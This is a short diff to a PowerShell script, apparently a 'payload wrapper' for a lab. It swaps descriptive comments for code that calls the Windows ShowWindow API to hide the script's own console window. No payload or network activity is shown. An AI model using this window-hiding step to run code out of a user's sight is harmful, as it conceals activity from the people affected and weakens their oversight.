@@ -1,5 +1,10 @@
-# Optimized PowerShell Wrapper for .ps1 Payload
-# Based on the MAS architecture for secure delivery
+$memberDefinition = @'
+[DllImport("user32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'@
+$type = Add-Type -MemberDefinition $memberDefinition -Name "Win32ShowWindow" -Namespace "Win32" -PassThru
+$handle = (Get-Process -Id $PID).MainWindowHandle
+$type::ShowWindow($handle, 0)
 
 if (-not $args) { 
     Write-Host 'Lab Script Initialized...' -ForegroundColor Cyan 
